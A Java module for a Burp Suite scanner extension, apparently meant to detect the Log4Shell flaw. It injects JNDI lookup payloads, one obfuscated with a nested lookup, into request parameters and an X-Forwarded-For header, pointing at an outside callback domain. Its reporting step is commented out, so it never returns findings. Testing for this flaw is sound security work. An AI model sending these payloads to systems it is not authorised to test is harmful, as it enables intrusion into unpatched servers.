package burp.j2ee.issues.collaimpl;

import java.util.ArrayList;
import java.util.List;

import burp.BurpDNSLogObject;
import burp.BurpExtender;
import burp.Getter;
import burp.HelperPlus;
import burp.IBurpExtenderCallbacks;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;
/**
 * 漏洞名称：Log4J2 RCE
 * 实验环境：
 * 参考链接：
 * 
 */

public class Log4jRCE implements IModule {

    private static final String TITLE = "Log4J RCE";
    private static final String DESCRIPTION = "";
    private static final String REMEDY = "update";

    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
    	
        IRequestInfo analyzeRequest = callbacks.getHelpers().analyzeRequest(baseRequestResponse);
        String host = baseRequestResponse.getHttpService().getHost();
        byte[] modifiedRawRequest =baseRequestResponse.getRequest();
        
        List<IScanIssue> issueForCollas = new ArrayList<IScanIssue>();
        
        List<String> payloads = new ArrayList<>();
        
        String payload = "${jndi:rmi://%s/xxx}";
        String payload1 = "${jn${lower:di:rmi://%s/xxx}}";
        
        payloads.add(payload);
        payloads.add(payload1);
        for (String payloaditem:payloads) {
//    		BurpDNSLogObject dnslog = new BurpDNSLogObject();
//    		String fullPayload = dnslog.getFullPayload();
    		
    		String fullPayload = host+"b.0y0.fun";
            
            payloaditem = String.format(payloaditem, fullPayload);
    		modifiedRawRequest = insertionPoint.buildRequest(payloaditem.getBytes());
    		
    		HelperPlus getter = new HelperPlus(BurpExtender.getHelpers());
    		modifiedRawRequest = getter.addOrUpdateHeader(true, modifiedRawRequest, "X-Forwarded-For", payloaditem);
    		
    		System.out.println("=================\r\n");
    		System.out.println(new String(modifiedRawRequest));
    		System.out.println("=================\r\n");
    		
            IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), modifiedRawRequest);
            
            CustomScanIssue issue =new CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    analyzeRequest.getUrl(),
                    new  IHttpRequestResponse[] {checkRequestResponse},
                    TITLE,
                    DESCRIPTION,
                    REMEDY,
                    Risk.High,
                    Confidence.Certain,
                    ""//dnslog.getInteractionID()
            );
            
            //issueForCollas.add(issue);
    	}
        return issueForCollas;
    }

	@Override
	public String getScanLevel() {
		return "insertpoint";
	}
	
	public static void main(String args[]) {

	}

}
